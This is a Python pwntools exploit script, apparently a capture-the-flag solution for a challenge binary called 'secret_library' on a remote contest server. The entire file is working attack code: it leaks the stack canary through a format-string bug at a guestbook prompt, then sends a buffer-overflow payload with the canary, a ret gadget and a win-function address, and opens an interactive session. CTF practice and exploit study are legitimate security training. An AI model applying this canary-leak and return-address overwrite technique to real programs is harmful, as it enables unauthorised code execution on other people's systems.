#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./secret_library", checksec=False)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote('offsec.m0lecon.it', 13504)
    return r

def main():
    p = conn()
    OFFSET = 136 #retrieved with pwndbg
    CAN_POS = 23 #format string leak
    win_addr = 0x00401262 #using rabin2
    ret_addr = 0x000000000040101a #gadget address (NO PIE)

    #Find the canary value
    p.recvuntil(b'guestbook: ')
    payload1 = b'A'*4 + f'.%{CAN_POS}$p'.encode()
    p.sendline(payload1)
    canary = int(p.recvline().decode().split(".")[1],16)
    log.info(f"Canary found: {canary:x}")

    #exploit
    p.recvuntil(b'review: ')
    payload2 = b'A'*OFFSET + p64(canary) + b'B'*8 + p64(ret_addr) + p64(win_addr)
    p.sendline(payload2)

    p.interactive()

if __name__ == "__main__":
    main()